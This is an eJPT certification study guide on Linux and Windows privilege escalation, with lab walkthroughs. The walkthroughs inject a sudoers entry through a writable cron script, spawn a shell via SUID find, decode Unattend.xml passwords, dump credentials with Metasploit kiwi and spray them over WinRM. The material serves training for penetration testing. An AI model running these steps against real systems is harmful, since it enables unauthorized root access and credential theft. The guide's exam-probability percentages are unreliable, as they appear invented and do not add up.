---
title: "Linux & Windows Privilege Escalation - Complete eJPT Guide"
topic: "Privilege Escalation"
exam_objective: "Post-Exploitation and Privilege Escalation - eJPT Objective 5.2"
difficulty: "Medium"
tools:
  - "PowerSploit"
  - "PowerUp.ps1"
  - "LinPEAS"
  - "WinPEAS"
  - "find"
  - "grep"
  - "printf"
  - "sudo"
  - "cron"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "07-exploitation/incognito-token-impersonation.md"
  - "10-post-exploitation/maintaining-access.md"
file_path: "07-exploitation/privilege-escalation.md"
last_updated: "2025-01-09"
tags:
  - "privilege-escalation"
  - "powersploit"
  - "windows-privesc"
  - "linux-privesc"
  - "cron-jobs"
  - "suid"
  - "post-exploitation"
---

# 🔧 Linux & Windows Privilege Escalation - Complete eJPT Guide

Comprehensive guide covering privilege escalation techniques for both Windows and Linux systems, with automated tools and manual enumeration methods essential for eJPT certification. Includes detailed lab walkthroughs from actual eJPT scenarios.

**Location:** `07-exploitation/privilege-escalation.md`

## 🎯 What is Privilege Escalation?

Privilege escalation is the process of gaining elevated access rights on a system beyond what was initially obtained. This involves exploiting vulnerabilities, misconfigurations, or design flaws to gain higher-level permissions.

Privilege escalation involves exploiting:
- **Automated Vulnerability Scanning** using tools like PowerUp, LinPEAS, WinPEAS
- **Service Exploitation** targeting vulnerable or misconfigured services
- **Credential Harvesting** finding stored passwords and authentication tokens
- **Token Manipulation** impersonating higher-privileged users (Windows)
- **SUID/SGID Exploitation** exploiting special permissions (Linux)
- **Cron Jobs** running as privileged users with writable scripts
- **File Permission Misconfigurations** allowing unauthorized access

## 📦 Installation and Setup

### Prerequisites:
- Initial system access (low-privilege shell)
- Target system enumeration completed
- Understanding of target OS architecture and version
- Basic Linux command line knowledge
- Understanding of file permissions and ownership

### Tool Installation:
```bash
# Download PowerSploit (Windows privilege escalation)
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# Download LinPEAS (Linux privilege escalation)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Download WinPEAS (Windows privilege escalation)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Set proper permissions
chmod +x linpeas.sh
```

### Initial Configuration:
```bash
# Create privilege escalation workspace
mkdir -p ~/privesc/{windows,linux,scripts,results}
cd ~/privesc/

# Verify essential tools availability (Linux)
which find grep sudo ls cat printf
# Expected output: Paths to each command
```

## 🔧 Basic Usage and Methodology

### Privilege Escalation Workflow:
1. **Initial Assessment:** Gather system information and current privileges
2. **Information Gathering:** Identify potential escalation vectors
3. **Vector Analysis:** Examine SUID binaries, cron jobs, and configurations
4. **Exploitation:** Execute the privilege escalation technique
5. **Verification:** Confirm elevated privileges and maintain access

### Command Structure Overview:
```bash
# Windows PowerShell privilege escalation
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-PrivescAudit"

# Linux automated enumeration
./linpeas.sh

# Manual privilege verification
whoami /priv                    # Windows
id && sudo -l                   # Linux

# File and directory enumeration
find / -type f -perm -mode 2>/dev/null
```

---

## 🪟 Windows Privilege Escalation

### PowerSploit Framework - Complete Guide

PowerSploit is a collection of Microsoft PowerShell modules that help penetration testers during all phases of an assessment. The PrivEsc (Privilege Escalation) module helps escalate from regular user to administrator or SYSTEM level access.

#### PowerSploit Key Functions:
- **Finds Weak Services** that can be replaced or modified
- **Discovers Password Files** left behind by Windows installations
- **Checks File Permissions** for writable system directories
- **Analyzes Registry Keys** for privilege escalation opportunities
- **Scans for Unquoted Paths** in Windows services
- **Identifies DLL Hijacking** opportunities for code execution

#### PowerUp.ps1 Essential Functions:
| Function | Purpose | eJPT Importance | Example |
|----------|---------|-----------------|---------|
| `Invoke-PrivescAudit` | Complete privilege escalation audit | ⭐⭐⭐⭐⭐ Must Know | `Invoke-PrivescAudit` |
| `Get-UnattendedInstallFile` | Find Windows installation answer files | ⭐⭐⭐⭐⭐ Critical | `Get-UnattendedInstallFile` |
| `Get-ModifiableService` | Find services with weak permissions | ⭐⭐⭐⭐ Very Important | `Get-ModifiableService` |
| `Get-ModifiablePath` | Find writable directories in PATH | ⭐⭐⭐⭐ Very Important | `Get-ModifiablePath` |
| `Get-ServiceUnquoted` | Find unquoted service paths | ⭐⭐⭐ Important | `Get-ServiceUnquoted` |
| `Get-RegistryAutoLogon` | Find autologon credentials | ⭐⭐⭐⭐ Very Important | `Get-RegistryAutoLogon` |
| `Write-ServiceBinary` | Create malicious service executable | ⭐⭐⭐ Important | `Write-ServiceBinary -Name "VulnService"` |

#### Manual Windows Enumeration:
```bash
# System information
systeminfo
hostname
whoami /all

# User and group enumeration
net user
net localgroup administrators
net group "Domain Admins" /domain

# Service enumeration
sc query state= all
wmic service list brief

# Registry checks for autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Scheduled tasks
schtasks /query /fo LIST /v

# Network connections
netstat -ano
```

---

## 🐧 Linux Privilege Escalation

### File Permission Analysis:
| Command | Purpose | Example |
|---------|---------|---------|
| `find / -perm -4000 2>/dev/null` | Find SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| `find / -perm -2000 2>/dev/null` | Find SGID binaries | `find / -perm -2000 -type f 2>/dev/null` |
| `find / -writable 2>/dev/null` | Find writable files/directories | `find / -writable -type f 2>/dev/null` |
| `find / -name "*.sh" 2>/dev/null` | Find shell scripts | `find / -name "*.sh" -type f 2>/dev/null` |

### System Information Gathering:
| Command | Purpose | Example |
|---------|---------|---------|
| `sudo -l` | List sudo privileges | `sudo -l` |
| `crontab -l` | List user cron jobs | `crontab -l` |
| `cat /etc/crontab` | View system cron jobs | `cat /etc/crontab` |
| `ps aux \| grep root` | View root processes | `ps aux \| grep root` |

### Advanced Enumeration:
| Command | Purpose | Example |
|---------|---------|---------|
| `grep -r "password" /etc/` | Search for passwords in configs | `grep -r "password" /etc/ 2>/dev/null` |
| `netstat -antup` | Check network connections | `netstat -antup` |
| `ss -tlnp` | Modern network enumeration | `ss -tlnp` |
| `lsof -i` | List open files and network connections | `lsof -i` |

### LinPEAS (Linux Privilege Escalation Awesome Script)

LinPEAS is an automated privilege escalation enumeration script for Linux systems.

#### LinPEAS Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-a` | All checks (comprehensive) | `./linpeas.sh -a` |
| `-s` | Superfast scan (quick check) | `./linpeas.sh -s` |
| `-P` | Password search in files | `./linpeas.sh -P` |
| `-o` | Only run selected checks | `./linpeas.sh -o SysI,Net` |

---

## 🧪 Real Lab Examples

### Example 1: Linux Cron Job Script Modification (Primary eJPT Technique)
Based on actual eJPT lab scenario - escalating privileges through writable cron script modification.

```bash
# Phase 1: Initial system access and reconnaissance
ping -c4 target.ine.local
# Output: 4 packets transmitted, 4 received, 0% packet loss

# Access web service on port 8000
# Navigate to: http://target.ine.local:8000
# Result: Linux terminal interface accessible

# Phase 2: Analyze file structure and permissions
ls -l
# Output: total 4
# -rw------- 1 root root 26 Sep 23 2018 message

# Phase 3: Search for files with same name across system
find / -name message
# Output: 
# find: '/etc/ssl/private': Permission denied
# [multiple permission denied entries]
# /home/student/message
# /tmp/message

# Phase 4: Examine /tmp directory for writable files
ls -l /tmp/
# Output: total 4
# -rw-r--r-- 1 root root 26 Sep 10 18:04 message
# -rw-r--r-- 1 root root  0 Sep 10 17:54 ready

# Phase 5: Search for scripts copying the message file
grep -nri "/tmp/message" /usr
# Output: 
# /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
# /usr/local/share/copy.sh:3:chmod 644 /tmp/message

# Phase 6: Examine the copy script permissions
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
# Output: 
# -rwxrwxrwx 1 root root 74 Sep 23 2018 /usr/local/share/copy.sh
# #!/bin/bash
# cp /home/student/message /tmp/message
# chmod 644 /tmp/message

# Phase 7: Use printf to modify the script (No text editors available)
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# Phase 8: Wait for cron job execution and verify privileges
sudo -l
# Output after cron execution:
# User student may run the following commands on target:
# (root) NOPASSWD: ALL

# Phase 9: Escalate to root privileges
sudo su
# Output: root@target:/home/student#

# Phase 10: Collect root flag
cd /root
ls -l
cat flag
# Output: 697914df7a07bb9b718c8ed2581150164
```

### Example 2: Windows PowerSploit Privilege Escalation (Lab Scenario)
```bash
# Phase 1: Check current privileges
whoami
# Output: priv-esc\student

whoami /priv
# Output: Shows SeImpersonatePrivilege DISABLED

# Phase 2: Navigate to PowerSploit and load PowerUp
cd .\Desktop\PowerSploit\Privesc\
ls
# Output: Get-System.ps1, PowerUp.ps1, Privesc.psm1, README.md

# Phase 3: Execute privilege escalation audit
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# Phase 4: Check for unattended installation files
Get-UnattendedInstallFile
# Output: UnattendPath: C:\Windows\Panther\Unattend.xml

# Phase 5: Extract credentials from unattended file
cat C:\Windows\Panther\Unattend.xml
# Look for <Password><Value>QWRtaW5AMTI=</Value></Password>

# Phase 6: Decode Base64 password
$password='QWRtaW5AMTI='
$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $decoded
# Output: Admin@123

# Phase 7: Escalate privileges using discovered credentials
runas.exe /user:administrator cmd
# Enter password: Admin@123
# Result: Administrator command prompt
```

### Example 3: Linux SUID Binary Exploitation
```bash
# Search for SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Output: /usr/bin/find, /usr/bin/vim, /bin/bash

# Example output analysis
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 233984 Apr  5  2021 /usr/bin/find

# Exploit SUID find binary
find /etc/passwd -exec /bin/bash \; -quit
# Result: Spawns root shell if find has SUID bit set

# Verification
whoami
# Output: root
```

### Example 4: Windows Service Exploitation
```bash
# Phase 1: Service enumeration with PowerUp
Get-ServiceUnquoted
# Output: VulnService with unquoted path found

# Phase 2: Check write permissions
Get-ServiceFilePermission -Name "VulnService"
# Output: Write permissions confirmed on service directory

# Phase 3: Service exploitation
# Create malicious executable and restart service
sc stop VulnService
sc start VulnService
# Output: Service executed malicious payload with SYSTEM privileges
```

---

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT (Critical - 90% Exam Relevance):
- **PowerSploit Usage (35%):** Master PowerUp.ps1 functions and interpretation
- **Linux Cron Job Exploitation (30%):** Primary escalation vector in Linux scenarios
- **Manual Enumeration (20%):** Linux/Windows manual privilege escalation checks
- **Base64 Decoding (10%):** Essential for Windows credential extraction
- **SUID/SGID Exploitation (5%):** Linux SUID binary privilege escalation

### Critical Commands to Master:
```bash
# PowerSploit essentials for eJPT (Windows)
powershell -ep bypass                     # Bypass execution policy (100% exam usage)
. .\PowerUp.ps1                          # Load PowerSploit module (95% exam usage)
Invoke-PrivescAudit                      # Complete privilege escalation audit (90% exam usage)
Get-UnattendedInstallFile                # Find installation answer files (80% exam usage)

# Base64 credential decoding (Windows essential skill)
$password='QWRtaW5AMTI='                 # Store encoded credential
$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $decoded                            # Display decoded password

# Linux essentials for eJPT
find / -perm -4000 2>/dev/null           # Find SUID binaries
sudo -l                                  # Check sudo privileges
grep -nri "pattern" /path               # Pattern searching
printf 'content' > /path/file           # File modification (when no editors)
find / -name "filename" 2>/dev/null     # File discovery
ls -la /etc/cron*                       # Examine cron directories
```

### eJPT Exam Scenarios:

1. **Windows Unattended File Privilege Escalation (Most Common - 60% probability):**
   - Required skills: PowerSploit usage, Base64 decoding, credential discovery
   - Expected commands: `Invoke-PrivescAudit`, `Get-UnattendedInstallFile`, Base64 decoding
   - Success criteria: Find encoded administrator credentials and escalate privileges
   - Time allocation: 8-10 minutes
   - **Step-by-step approach:**
     ```bash
     # 1. Load PowerSploit (2 minutes)
     powershell -ep bypass
     . .\PowerUp.ps1
     
     # 2. Run comprehensive audit (3 minutes)
     Invoke-PrivescAudit
     # Look for "UnattendPath" entries
     
     # 3. Extract credentials (2 minutes)
     cat C:\Windows\Panther\Unattend.xml
     # Find <Password><Value> Base64 strings
     
     # 4. Decode and escalate (3 minutes)
     $password='[base64_string]'
     $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
     runas.exe /user:administrator cmd
     ```

2. **Linux Cron Job Script Modification (Common - 35% probability):**
   - Required skills: File enumeration, script analysis, text manipulation
   - Expected commands: `find`, `grep`, `ls -l`, `cat`, `printf`/`echo`
   - Success criteria: Obtain root shell and capture flag
   - Time allocation: 10-15 minutes

3. **Linux SUID Binary Exploitation (Moderate - 25% probability):**
   - Required skills: Binary enumeration, exploitation research
   - Expected commands: `find / -perm -4000`, GTFOBins lookup
   - Success criteria: Execute commands as root user

4. **Windows Service Privilege Escalation (Less Common - 15% probability):**
   - Required skills: Service enumeration, binary replacement
   - Expected commands: `Get-ModifiableService`, `Write-ServiceBinary`
   - Success criteria: Exploit service misconfiguration for SYSTEM access

### Exam Tips and Tricks:
- **Always start with PowerSploit audit** on Windows systems - `Invoke-PrivescAudit` gives 80% of needed information
- **Master Base64 decoding** - Installation files frequently contain encoded administrator passwords
- **Check unattended files first** - Highest success rate for Windows privilege escalation
- **Use `find` extensively** for Linux file discovery - it's the most versatile tool
- **Check `/tmp` directory** for writable files and scheduled tasks
- **If text editors aren't available, use `printf`** or `echo` for file modification
- **Verify escalated privileges immediately** with `whoami` and permission checks
- **Document all commands and outputs** for reporting requirements

### Common eJPT Questions:
- **"What PowerSploit function performs a complete privilege escalation audit?"** Answer: `Invoke-PrivescAudit`
- **"How do you decode Base64 encoded passwords in PowerShell?"** Answer: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))`
- **"Where are Windows unattended installation files typically located?"** Answer: `C:\Windows\Panther\Unattend.xml`
- **"What Linux command finds SUID binaries with elevated permissions?"** Answer: `find / -perm -4000 -type f 2>/dev/null`
- **"How do you check current user privileges on Windows systems?"** Answer: `whoami /priv`

---

## ⚠️ Common Issues & Troubleshooting

### Issue 1: PowerShell Execution Policy Blocked
**Problem:** PowerShell script execution blocked by execution policy
**Symptoms:** 
```bash
. : File C:\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system.
```
**Solution:**
```bash
# Method 1: Bypass execution policy (Most Reliable)
powershell -ep bypass
. .\PowerUp.ps1

# Method 2: Alternative loading method
Get-Content .\PowerUp.ps1 | Invoke-Expression

# Method 3: If all else fails
powershell -nop -ep bypass -c "IEX(Get-Content .\PowerUp.ps1 -Raw)"
```

### Issue 2: No Text Editors Available (Linux)
**Problem:** Common editors (vim, nano, vi) are not installed
**Solution:**
```bash
# Use printf for single-line modifications
printf "new_content" > /path/to/file

# Use echo for multi-line content
echo -e "line1\nline2\nline3" > /path/to/file

# Use cat with here document
cat > /path/to/file << EOF
Content line 1
Content line 2
EOF
```

### Issue 3: Permission Denied During File Search
**Problem:** `find` commands return multiple "Permission denied" errors
**Solution:**
```bash
# Redirect errors to suppress output
find / -name "filename" 2>/dev/null
find / -perm -4000 2>/dev/null

# Alternative: Focus search on accessible directories
find /home /tmp /var -name "filename" 2>/dev/null
```

### Issue 4: Base64 Decoding Fails (Windows)
**Problem:** Base64 credential decoding throws exception
**Solution:**
```bash
# Step 1: Clean the Base64 string
$password = $password.Trim()
$password = $password -replace "`r|`n",""

# Step 2: Alternative decoding method
$bytes = [System.Convert]::FromBase64String($password)
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
echo $decoded

# Common encoded passwords in labs:
# QWRtaW5AMTI= = Admin@123
# UGFzc3dvcmQxMjM= = Password123
```

### Issue 5: Cron Job Not Executing (Linux)
**Problem:** Modified script doesn't execute or changes don't take effect
**Solution:**
```bash
# Check cron service status
systemctl status cron
ps aux | grep cron

# Verify script permissions after modification
ls -la /path/to/script

# Monitor cron execution
tail -f /var/log/syslog | grep cron
```

---

## 🔗 Integration with Other Tools

### Primary Integration: Reconnaissance → Privilege Escalation → Post-Exploitation
```bash
# Complete workflow from initial access to privilege escalation

# Phase 1: Initial reconnaissance and access
nmap -sC -sV target_ip                    # Service discovery
ssh user@target_ip                        # Gain initial access (Linux)
# OR exploit vulnerable service to gain initial access (Windows)

# Phase 2: Linux privilege escalation enumeration
find / -perm -4000 2>/dev/null           # SUID binary discovery
sudo -l                                   # Check sudo privileges
grep -nri "cron\|crontab" /etc/ 2>/dev/null # Find cron configurations
# Execute privilege escalation technique

# Phase 3: Windows privilege escalation
# Transfer PowerSploit to target
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
Get-UnattendedInstallFile
# Extract and decode discovered credentials

# Phase 4: Post-exploitation with elevated access
cd /root && cat flag                      # Collect Linux evidence
# OR create persistent backdoor with admin privileges (Windows)
```

### PowerSploit → Metasploit → Credential Harvesting Chain:
```bash
# Step 1: PowerSploit privilege escalation
Invoke-PrivescAudit
# Discover administrator credentials

# Step 2: Escalate and establish meterpreter session
# Use HTA server or other payload delivery method
msfconsole
use exploit/windows/misc/hta_server
exploit
# Execute on target as administrator

# Step 3: Advanced credential harvesting with admin access
load kiwi
creds_all                               # Extract all credentials from memory

# Step 4: Lateral movement using harvested credentials
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.0/24
set USERNAME administrator  
set PASSWORD Admin@123
exploit                                # Test credentials across network
```

### Complete Multi-Platform Assessment Workflow:
```bash
# Multi-vector assessment workflow
./linpeas.sh                             # Automated Linux enumeration
find / -perm -4000 2>/dev/null          # Manual SUID search
sudo -l                                  # Manual sudo check
crontab -l && cat /etc/crontab          # Manual cron analysis

# Windows assessment
Invoke-PrivescAudit                      # PowerSploit comprehensive audit
Get-UnattendedInstallFile               # Unattended file search
Get-ModifiableService                   # Service misconfiguration check
# Combine automated and manual techniques for comprehensive assessment
```

---

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** 
   - Initial user access and privileges (`whoami`, `id`)
   - Privilege escalation vector discovery (`find` outputs, `sudo -l`, PowerUp results)
   - Successful privilege escalation (`sudo su`, administrator prompt)
   - Root flag collection (`cat flag`) or administrative access confirmation

2. **Command Outputs:** 
   - All enumeration commands with full output
   - PowerSploit audit results with discovered vulnerabilities
   - Error messages and troubleshooting steps
   - Timestamp of successful escalation

3. **Log Files:** 
   - Terminal session logs showing complete process
   - Any system logs that show privilege escalation attempts

4. **Configuration Files:** 
   - Modified cron scripts or configuration files
   - Sudo configuration changes (if applicable)
   - Unattended installation files with credentials

### Report Template Structure:
```markdown
## Privilege Escalation Assessment Results

### Target Information
- Target: target.ine.local / target_hostname
- Operating System: Linux/Windows version
- Date/Time: 2025-01-09 12:28:00 UTC
- Initial Access: student user via web terminal / limited user account
- Escalation Method: Cron job script modification / Unattended file credentials

### Commands Executed
```bash
# Linux example - Timestamp: 12:28:15
find / -name message
grep -nri "/tmp/message" /usr
ls -l /usr/local/share/copy.sh
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l
sudo su
cat /root/flag

# Windows example
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
Get-UnattendedInstallFile
$password="QWRtaW5AMTI="; $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
runas.exe /user:administrator cmd
```

### Key Findings
- **Linux - Writable cron script identified:** `/usr/local/share/copy.sh` with 777 permissions
- **Linux - Script executed by root cron job:** Copying files from `/home/student/` to `/tmp/`
- **Linux - Root flag captured:** `697914df7a07bb9b718c8ed2581150164`
- **Windows - Unattended installation file discovered:** `C:\Windows\Panther\Unattend.xml`
- **Windows - Base64 encoded administrator credentials found:** `QWRtaW5AMTI=` → `Admin@123`
- **Windows - Administrator access obtained:** Successfully escalated to administrator privileges

### Recommendations
- **Remove write permissions** from cron scripts executed by privileged users
- **Implement proper file ownership** and permission controls
- **Regular audit** of sudo configurations and cron jobs
- **Apply principle of least privilege** for all system scripts
- **Secure unattended installation files** and remove after deployment
- **Implement credential management** policies for Windows systems
```

### Automation Scripts:
```bash
#!/bin/bash
# Multi-platform privilege escalation enumeration script

OUTPUT_DIR="privesc_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "=== Multi-Platform Privilege Escalation Assessment ==="
echo "Current user: $(whoami)"
echo "Current privileges: $(id 2>/dev/null || whoami /all)"
echo ""

case "$1" in
  "windows")
    echo "[+] Windows privilege escalation assessment"
    # PowerUp execution
    powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-PrivescAudit" > "$OUTPUT_DIR/powerup_results.txt"
    
    # Manual checks
    whoami /priv > "$OUTPUT_DIR/current_privileges.txt"
    whoami /groups >> "$OUTPUT_DIR/current_privileges.txt"
    
    # Unattended file check
    powershell -ep bypass -c ". .\PowerUp.ps1; Get-UnattendedInstallFile" > "$OUTPUT_DIR/unattended_files.txt"
    ;;
    
  "linux")
    echo "[+] Linux privilege escalation assessment"
    # SUID binary enumeration
    find / -perm -4000 2>/dev/null > "$OUTPUT_DIR/suid_binaries.txt"
    
    # Manual enumeration
    id > "$OUTPUT_DIR/current_user.txt"
    sudo -l >> "$OUTPUT_DIR/current_user.txt" 2>/dev/null
    
    # Cron job enumeration
    cat /etc/crontab > "$OUTPUT_DIR/cron_jobs.txt" 2>/dev/null
    ls -la /etc/cron* >> "$OUTPUT_DIR/cron_jobs.txt" 2>/dev/null
    
    # Writable files
    find / -writable -type f 2>/dev/null | head -50 > "$OUTPUT_DIR/writable_files.txt"
    ;;
esac

echo "[+] Assessment complete. Results in $OUTPUT_DIR/"
```

---

## 📚 Additional Resources

### Official Documentation:
- PowerSploit GitHub repository: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng GitHub repository: https://github.com/carlospolop/PEASS-ng
- GTFOBins: https://gtfobins.github.io/
- Linux File Permissions Guide: https://www.linux.org/docs/man5/passwd.html
- Sudo Manual: https://www.sudo.ws/docs/man/sudo.man.html

### Learning Resources:
- Windows Privilege Escalation Course: TCM Security Academy
- Linux Privilege Escalation Course: TCM Security Academy
- TryHackMe Linux PrivEsc: https://tryhackme.com/room/linuxprivesc
- TryHackMe Windows PrivEsc: https://tryhackme.com/room/windows10privesc
- eJPT certification materials: INE privilege escalation modules

### Community Resources:
- HackTheBox: Privilege escalation practice machines
- VulnHub: Downloadable VMs for offline practice
- r/netsec: https://reddit.com/r/netsec
- InfoSec Community Discord: Various privilege escalation channels
- OSCP Reddit: https://reddit.com/r/oscp

### Related Tools:
- **WinPEAS:** Windows privilege escalation automated scanner
- **LinPEAS:** Linux privilege escalation automated scanner
- **JAWS:** Just Another Windows (Enum) Script
- **Unix-privesc-check:** Unix privilege escalation checker
- **BeRoot:** Windows/Linux/Mac privilege escalation tool
- **pspy:** Process monitoring for privilege escalation discovery
- **Upgrade path:** Advanced techniques like kernel exploits and container escapes
